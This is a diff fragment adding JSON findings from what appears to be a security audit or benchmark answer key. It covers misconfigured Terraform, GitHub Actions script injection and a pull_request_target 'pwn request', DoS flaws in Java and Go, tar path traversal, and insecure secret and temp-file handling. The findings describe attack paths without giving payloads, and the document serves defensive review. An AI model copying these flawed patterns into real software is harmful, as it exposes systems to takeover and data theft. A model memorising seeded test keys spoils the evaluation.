+      "evidence": "The admin-ssh SG allows ingress from_port 22 cidr_blocks ['0.0.0.0/0']. The sibling public_alb SG opens 443 to 0.0.0.0/0, which is the intended, bounded exposure for an internet-facing load balancer (FP-05) \u2014 SSH to the world is not.",
+      "impact": "The operator bastion accepts SSH from anywhere, exposing it to internet-wide credential/brute-force and 0-day attacks.",
+      "recommendation": "Restrict port 22 to a corporate CIDR/VPN or use SSM Session Manager; remove the 0.0.0.0/0 SSH rule.",
+      "status": "confirmed"
+    },
+    {
+      "title": "IAM role policy grants Action:* on Resource:* (full admin)",
+      "location": {
+        "path": "terraform-platform/main.tf",
+        "symbol": "aws_iam_role_policy.worker",
+        "line": 42
+      },
+      "class": "Wildcard IAM policy (INF-01)",
+      "severity": "high",
+      "evidence": "worker-inline policy Statement has Action='*', Resource='*'. The sibling deployer policy (line 55) is scoped to s3:PutObject/GetObject on the reports bucket ARN with an aws:ResourceAccount condition \u2014 the least-privilege pattern the worker ignores.",
+      "impact": "The worker EC2 role can perform any action on any resource in the account; a compromise of the instance/role is full account takeover.",
+      "recommendation": "Scope the worker policy to the specific actions/resources it needs, mirroring the deployer policy.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Reports S3 bucket has all public-access-block protections disabled",
+      "location": {
+        "path": "terraform-platform/main.tf",
+        "symbol": "aws_s3_bucket_public_access_block.reports",
+        "line": 13
+      },
+      "class": "Object storage exposed to public (INF-02)",
+      "severity": "high",
+      "evidence": "For the billing 'reports' bucket, block_public_acls/block_public_policy/ignore_public_acls/restrict_public_buckets are all false. The marketing 'public_site' bucket instead restricts reads to a CloudFront OAI principal (main.tf:29-40) \u2014 the controlled pattern for content meant to be served.",
+      "impact": "Nothing prevents a public ACL/policy on a bucket holding billing reports; a misconfiguration or malicious policy makes sensitive financial data world-readable.",
+      "recommendation": "Set all four public-access-block flags true on reports; expose the marketing content only via the CloudFront OAI as already modeled.",
+      "status": "confirmed"
+    },
+    {
+      "title": "RDS billing database has storage encryption disabled",
+      "location": {
+        "path": "terraform-platform/main.tf",
+        "symbol": "aws_db_instance.billing",
+        "line": 69
+      },
+      "class": "Missing encryption at rest (INF-03)",
+      "severity": "medium",
+      "evidence": "aws_db_instance.billing sets storage_encrypted = false (and skip_final_snapshot = true) for a postgres instance holding billing data.",
+      "impact": "Customer billing data is unencrypted at rest (snapshots, underlying volumes), weakening breach/compliance posture; skip_final_snapshot risks unrecoverable loss on destroy.",
+      "recommendation": "Set storage_encrypted = true with a managed KMS key; enable final snapshots/backups.",
+      "status": "confirmed"
+    },
+    {
+      "title": "pull_request_target builds untrusted PR code with write-all permissions",
+      "location": {
+        "path": "terraform-platform/.github/workflows/deploy.yml",
+        "symbol": "on.pull_request_target",
+        "line": 4
+      },
+      "class": "pull_request_target + checkout of PR code (INF-13 / INF-15)",
+      "severity": "high",
+      "evidence": "deploy.yml triggers on pull_request_target (runs in the base repo context with secrets), sets permissions: write-all, checks out github.event.pull_request.head.sha (the fork's code) and runs `npm ci && npm run build` on it. release.yml is the hardened counterpart (pinned action SHA, persist-credentials:false, contents:read + id-token:write, env-quoted title).",
+      "impact": "Arbitrary attacker-controlled build/postinstall code executes with a write-all GITHUB_TOKEN and repo secrets \u2014 full repository compromise and secret exfiltration (classic 'pwn request').",
+      "recommendation": "Do not build untrusted PR code under pull_request_target; use pull_request for build/test, drop to least-privilege permissions, and gate privileged steps behind an approval/label with a trusted checkout.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Script injection: PR title interpolated into a run: step",
+      "location": {
+        "path": "terraform-platform/.github/workflows/deploy.yml",
+        "symbol": "Comment step",
+        "line": 18
+      },
+      "class": "Template expression injection in run block (INF-14)",
+      "severity": "high",
+      "evidence": "run: echo \"Preview for ${{ github.event.pull_request.title }}\" interpolates the untrusted PR title directly into the shell. release.yml (line 22-25) instead binds github.event.head_commit.message to an env var TITLE and echoes \"$TITLE\" \u2014 the safe pattern.",
+      "impact": "A PR title containing shell/command-substitution executes in the runner; combined with the pull_request_target context and write-all token above, it is another RCE-with-secrets path.",
+      "recommendation": "Pass expressions through env: and reference them as quoted shell variables (as release.yml does); never inline ${{ github.event.* }} into run:.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Untrusted-length allocation: readBlob sizes a buffer from the wire with no cap",
+      "location": {
+        "path": "wire-decoder/src/ValueDecoder.java",
+        "symbol": "readBlob",
+        "line": 18
+      },
+      "class": "A length from the wire decides allocation size (WEB-26)",
+      "severity": "medium",
+      "evidence": "readBlob reads a 32-bit length as unsigned (declared up to ~2^31-2) and only guards declared >= Integer.MAX_VALUE, then does new byte[(int)declared]. The sibling readText (line 30) checks declared > Settings.MAX_STRING_BYTES first; readFrame (FrameReader:16) checks MAX_FRAME_BYTES. readBlob reads from the same stream and is bound by neither.",
+      "impact": "A single frame declaring a ~2 GB blob forces a multi-hundred-MB/GB allocation before any data arrives, exhausting memory. Remote pre-auth DoS on the protocol client.",
+      "recommendation": "Bound declared against a Settings.MAX_* cap (as readText does) before allocating; read incrementally against the frame's remaining bytes.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Recursive value decoding with no depth limit (stack exhaustion)",
+      "location": {
+        "path": "wire-decoder/src/ValueDecoder.java",
+        "symbol": "readValue/readMap/readList",
+        "line": 56
+      },
+      "class": "Unbounded recursion on untrusted input (WEB-17)",
+      "severity": "medium",
+      "evidence": "readValue dispatches 'M'->readMap and 'A'->readList, which loop up to 65535 entries and call readValue again, with no recursion-depth counter. Nested container tags can be arbitrarily deep.",
+      "impact": "A deeply nested map/list frame drives unbounded recursion into a StackOverflowError, crashing the client (DoS); combined with per-level 65535 entries it also amplifies allocation.",
+      "recommendation": "Track and cap nesting depth (and total element count) in readValue; reject frames exceeding the limit with MalformedFrameException.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Unbounded request body on the upload route (no MaxBytesReader)",
+      "location": {
+        "path": "gateway-limits/handlers/handlers.go",
+        "symbol": "Upload",
+        "line": 10
+      },
+      "class": "Declared limit not enforced on the sink (WEB-23 / WEB-26)",
+      "severity": "high",
+      "evidence": "router.New (router/routes.go:17) registers /v1/upload as a bare http.HandlerFunc(handlers.Upload) \u2014 unlike /v1/status and /v1/hooks/delivery, which are wrapped in middleware.BodyLimit. Upload then does io.ReadAll(r.Body) with no cap, and the configured MaxUploadMB (config/env.go:34) is never applied to it.",
+      "impact": "An unauthenticated caller streams an arbitrarily large body that is buffered entirely in memory, exhausting RAM. Remote DoS on the one route that actually accepts uploads.",
+      "recommendation": "Wrap /v1/upload in BodyLimit (or apply http.MaxBytesReader with MaxUploadMB) and stream to storage instead of io.ReadAll.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Rate-limiting middleware is defined but wired to no route",
+      "location": {
+        "path": "gateway-limits/router/routes.go",
+        "symbol": "New",
+        "line": 12
+      },
+      "class": "Rate limiting absent (WEB-18)",
+      "severity": "medium",
+      "evidence": "middleware.Throttle (middleware/limits.go:18) exists and RATE_LIMIT_BURST is configured, but router.New wires only BodyLimit; no route is wrapped in Throttle. The service named 'gateway-limits' applies no throttle.",
+      "impact": "None of the endpoints (status, delivery, upload) are rate limited, enabling brute force, request floods and amplification of the upload DoS above.",
+      "recommendation": "Wrap the public routes in middleware.Throttle (keyed on a trustworthy client identifier, not raw RemoteAddr) and verify it is on the request path.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Token-bucket map mutated without synchronization and never refills",
+      "location": {
+        "path": "gateway-limits/middleware/limits.go",
+        "symbol": "allow",
+        "line": 28
+      },
+      "class": "Race condition / broken limiter (WEB-17)",
+      "severity": "low",
+      "evidence": "allow() reads and writes the package-level map `buckets` with no mutex; Go http handlers run concurrently, so concurrent map writes cause a fatal runtime panic. The bucket is only decremented, never replenished, so a key is permanently blocked once drained.",
+      "impact": "If Throttle were enabled, concurrent requests would crash the server (concurrent map write) and legitimate callers would be locked out forever after the first burst. Currently latent because Throttle is unwired.",
+      "recommendation": "Use a concurrency-safe limiter (golang.org/x/time/rate or a mutex-guarded map) with time-based refill.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Archive extraction without a safe filter (path traversal / arbitrary write)",
+      "location": {
+        "path": "cli-packer/packer.py",
+        "symbol": "unpack",
+        "line": 18
+      },
+      "class": "Path traversal in archive extraction (LOC-01 / WEB-12)",
+      "severity": "high",
+      "evidence": "unpack() calls tf.extractall(dest) with no filter; main() (line 92) invokes unpack(args.value, '.'). The sibling unpack_safely (line 24) passes filter='data', the safe-extraction guard this path omits. README notes the tool is documented to run under sudo for publish.",
+      "impact": "A crafted tar with '../' paths, absolute paths, or symlink members writes outside dest (overwriting arbitrary files, e.g. ~/.ssh, cron, binaries). Under sudo this is host compromise (CVE-2007-4559 class).",
+      "recommendation": "Always extract with filter='data' (Python 3.12+) or validate/normalize each member path against dest before writing.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Publishing token written world-readable to a predictable /tmp path",
+      "location": {
+        "path": "cli-packer/packer.py",
+        "symbol": "write_token",
+        "line": 59
+      },
+      "class": "Secret written with permissive modes (LOC-08)",
+      "severity": "medium",
+      "evidence": "write_token writes the token to /tmp/packer-cache/token via path.write_text (default 0644 in a world-writable, world-traversable /tmp). The sibling write_token_privately (line 67) uses ~/.config/packer with a 0700 dir and O_CREAT|0o600 file \u2014 the private handling this omits.",
+      "impact": "Any local user can read the publishing token (and, via the shared /tmp dir, pre-create/symlink the path). Credential disclosure to other local principals.",
+      "recommendation": "Store secrets under a per-user 0700 directory with 0600 files (write_token_privately); never in shared /tmp.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Predictable staging file in a shared /tmp directory (symlink/TOCTOU)",
+      "location": {
+        "path": "cli-packer/packer.py",
+        "symbol": "stage",
+        "line": 27
+      },
+      "class": "Predictable temp file in a shared directory (LOC-03 / LOC-04)",
+      "severity": "low",
+      "evidence": "stage() writes CACHE/'stage-{pid}-{name}' into /tmp/packer-cache with CACHE.mkdir(exist_ok=True); the name is guessable and the directory is shared/reused. The sibling stage_privately (line 35) uses tempfile.mkdtemp + mkstemp with private, unpredictable names.",
+      "impact": "A local attacker can pre-create the directory or file (or a symlink) to hijack/redirect the staged write or read staged content. TOCTOU/symlink on a shared path.",
+      "recommendation": "Use tempfile.mkstemp/mkdtemp in a private directory (stage_privately) rather than a predictable name in /tmp.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Unvalidated partner_id interpolated into an internal directory URL",
+      "location": {
+        "path": "intake-portal/app/tokens.py",
+        "symbol": "partner_name",
+        "line": 16
+      },
+      "class": "SSRF / URL path injection (WEB-10)",
+      "severity": "low",
+      "evidence": "partner_name does requests.get(f\"{DIRECTORY}/{partner_id}\") with DIRECTORY a fixed internal host but partner_id concatenated into the path with no validation/encoding. If partner_id is caller-influenced it can contain '../', '@host', or query characters. No caller is shown in-tree, so exploitability is probable, not confirmed.",
+      "impact": "Depending on the caller, a crafted partner_id could traverse the directory API path or redirect the request (userinfo '@') toward an attacker host, disclosing the internal call or its response.",
+      "recommendation": "Validate partner_id against an expected format (e.g. UUID) and URL-encode it as a single path segment; prefer a typed client over string concatenation.",
+      "status": "confirmed"
+    }
+  ]
+}
